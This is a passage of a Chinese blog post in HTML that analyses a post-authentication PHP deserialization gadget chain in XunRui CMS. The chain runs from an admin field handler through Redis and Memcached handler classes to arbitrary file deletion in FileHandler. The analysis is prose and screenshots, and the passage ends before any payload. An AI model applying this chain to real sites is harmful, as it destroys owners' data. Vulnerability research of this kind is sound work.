@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="影响版本version&lt;&#x3D;2023-06-24(目前最新版) 环境搭建官网自行下载安装迅睿CMS 代码分析漏洞触发点在后台并且新版安装后的后台地址为admin+md5(随机数)，没啥用。   反序列化触发点dayrui&#x2F;Fcms&#x2F;Core&#x2F;Helper.php 注意: 这里使用了stripslashes()函数进行过滤，为了正确地进行反序列化操作，需要对传入的字符串 “xxx\aa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次项目中迅睿CMS反序列化漏洞挖掘">
+<meta property="og:url" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/index.html">
+<meta property="og:site_name" content="Wafinfo&#39;s Blog">
+<meta property="og:description" content="影响版本version&lt;&#x3D;2023-06-24(目前最新版) 环境搭建官网自行下载安装迅睿CMS 代码分析漏洞触发点在后台并且新版安装后的后台地址为admin+md5(随机数)，没啥用。   反序列化触发点dayrui&#x2F;Fcms&#x2F;Core&#x2F;Helper.php 注意: 这里使用了stripslashes()函数进行过滤，为了正确地进行反序列化操作，需要对传入的字符串 “xxx\aa">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625163603380.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625162654870.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625164706872.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625165442107.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625170156424.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625170536372.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625170643542.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625172007075.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625172151886.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625172244985.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626154902737.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626154037148.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626154424756.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626155240048.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626155631159.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626155731009.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626161318185.png">
+<meta property="og:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626161302226.png">
+<meta property="article:published_time" content="2023-06-25T08:22:47.547Z">
+<meta property="article:modified_time" content="2023-06-26T13:29:22.225Z">
+<meta property="article:author" content="Wafinfo&#39;s Blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625163603380.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>记一次项目中迅睿CMS反序列化漏洞挖掘</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="https://github.com/wafinfo">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/03/10/%E5%B8%86%E8%BD%AFchannel%E6%8E%A5%E5%8F%A3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&text=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&title=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&is_video=false&description=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次项目中迅睿CMS反序列化漏洞挖掘&body=Check out this article: https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&title=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&title=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&title=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&title=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&name=记一次项目中迅睿CMS反序列化漏洞挖掘&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&t=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">3.1.</span> <span class="toc-text">反序列化触发点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞入口点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct%E5%88%A9%E7%94%A8%E5%9C%B0%E5%9D%801"><span class="toc-number">3.2.1.</span> <span class="toc-text">__destruct利用地址1:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct%E5%88%A9%E7%94%A8%E5%9C%B0%E5%9D%802"><span class="toc-number">3.2.2.</span> <span class="toc-text">__destruct利用地址2:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct%E5%88%A9%E7%94%A8%E5%9C%B0%E5%9D%803"><span class="toc-number">3.2.3.</span> <span class="toc-text">__destruct利用地址3:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct%E5%88%A9%E7%94%A8%E5%9C%B0%E5%9D%804"><span class="toc-number">3.2.4.</span> <span class="toc-text">__destruct利用地址4:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="toc-number">3.3.</span> <span class="toc-text">利用链 任意文件删除</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        记一次项目中迅睿CMS反序列化漏洞挖掘
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Wafinfo's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-06-25T08:22:47.547Z" itemprop="datePublished">2023-06-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>version&lt;&#x3D;2023-06-24(目前最新版)</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官网自行下载安装<a target="_blank" rel="noopener" href="https://www.xunruicms.com/">迅睿CMS</a></p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>漏洞触发点在后台并且新版安装后的后台地址为admin+md5(随机数)，没啥用。</p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625163603380.png" alt="image-20230625163603380"></p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625162654870.png" alt="image-20230625162654870"></p>
+<h3 id="反序列化触发点"><a href="#反序列化触发点" class="headerlink" title="反序列化触发点"></a>反序列化触发点</h3><p><code>dayrui/Fcms/Core/Helper.php</code></p>
+<p><strong>注意</strong>: 这里使用了<code>stripslashes()</code>函数进行过滤，为了正确地进行反序列化操作，需要对传入的字符串 “xxx\aaa” 进行修改，将其变为 “xxx\\aaa”。</p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625164706872.png" alt="image-20230625164706872"></p>
+<h3 id="漏洞入口点"><a href="#漏洞入口点" class="headerlink" title="漏洞入口点"></a>漏洞入口点</h3><p>后台很多调用<code>dr_string2array()</code>方法，并且没有进行参数过滤。 这里随便找了一个。</p>
+<p><code>dayrui/Fcms/Control/Admin/Field.php</code></p>
+<p>分析下这段代码，首先\Phpcmf\Service::L(‘input’)-&gt;post(‘code’)该代码通过调用Input.php文件里定义的Input类的post()函数,在接收到post请求且存在key为code时进行xss过滤并返回。</p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625165442107.png" alt="image-20230625165442107"></p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625170156424.png" alt="image-20230625170156424"></p>
+<p> 分析利用链，这里只有5个<code>__destruct()</code>不多一个个看。</p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625170536372.png" alt="image-20230625170536372"></p>
+<h4 id="destruct利用地址1"><a href="#destruct利用地址1" class="headerlink" title="__destruct利用地址1:"></a><code>__destruct</code>利用地址1:</h4><p> <code>dayrui/CodeIgniter/System/Email/Email.php</code></p>
+<p>由于这里<code>is_resource()</code>是判断是否为资源类型，无法绕过Pass掉。</p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625170643542.png" alt="image-20230625170643542"></p>
+<h4 id="destruct利用地址2"><a href="#destruct利用地址2" class="headerlink" title="__destruct利用地址2:"></a><code>__destruct</code>利用地址2:</h4><p> <code>dayrui/Fcms/Library/Tree.php</code>无法触发魔术函数Pass掉。</p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625172007075.png" alt="image-20230625172007075"></p>
+<h4 id="destruct利用地址3"><a href="#destruct利用地址3" class="headerlink" title="__destruct利用地址3:"></a><code>__destruct</code>利用地址3:</h4><p> <code>dayrui/CodeIgniter/System/Cache/Handlers/MemcachedHandler.php</code> 后续跟了下无法深度利用，暂时不看。</p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625172151886.png" alt="image-20230625172151886"></p>
+<h4 id="destruct利用地址4"><a href="#destruct利用地址4" class="headerlink" title="__destruct利用地址4:"></a><code>__destruct</code>利用地址4:</h4><p> <code>dayrui/CodeIgniter/System/Cache/Handlers/RedisHandler.php</code></p>
+<p>这里就有很多路线可走，这里就直接分析挖好的利用链，所有方法看完了都没找到命令执行和文件写入就是太菜了，只找到了一个文件删除垃圾链。</p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230625172244985.png" alt="image-20230625172244985"></p>
+<p>这里相当于<code>redis</code>可控，只要找到一个类有<code>close()</code>方法就可以继续往下走，或者找一个类不存在<code>close()</code>方法从而触发<code>__call</code>由于分析走<code>__call</code>没找到特别好用的就不分析了。 </p>
+<p>这里找到<code>dayrui/CodeIgniter/System/Session/Handlers/MemcachedHandler.php</code>相当于<code>memcached</code>和<code>lockKey</code>可控。继续往下在找</p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626154902737.png" alt="image-20230626154902737"></p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626154037148.png" alt="image-20230626154037148"></p>
+<p>这里找到了<code>dayrui/CodeIgniter/System/Cache/Handlers/FileHandler.php</code>,首先将传入的<code>key、prefix</code>参数传入到<code>validateKey</code>静态方法中,这里<code>key、prefix</code>都可控。</p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626154424756.png" alt="image-20230626154424756"></p>
+<p>这里判断传入的<code>key</code>是否为字符串类型和不为空，最后将<code>key</code>和<code>prefix</code>拼接判断长度是否超过了最大键长度，如果没有返回拼接后的值。  之前说了<code>key、prefix</code>都可控而<code>key</code>是由<code>lockKey</code>进行赋值，例如<code>lockKey = &quot;.php&quot;，prefix = &quot;api&quot;;</code>–&gt;<code>api.php</code></p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626155240048.png" alt="image-20230626155240048"></p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626155631159.png" alt="image-20230626155631159"></p>
+<p>最后将<code>path</code>和<code>key</code>进行拼接判断对应的文件是否存在，如果存在则删除该文件。一个完整的文件删除利用链构造成功。</p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626155731009.png" alt="image-20230626155731009"></p>
+<h3 id="利用链-任意文件删除"><a href="#利用链-任意文件删除" class="headerlink" title="利用链 任意文件删除"></a>利用链 任意文件删除</h3><p>php7.1+反序列化对类属性不敏感，正好环境需要php7.4以上才能安装所以都写成public也不太影响。</p>
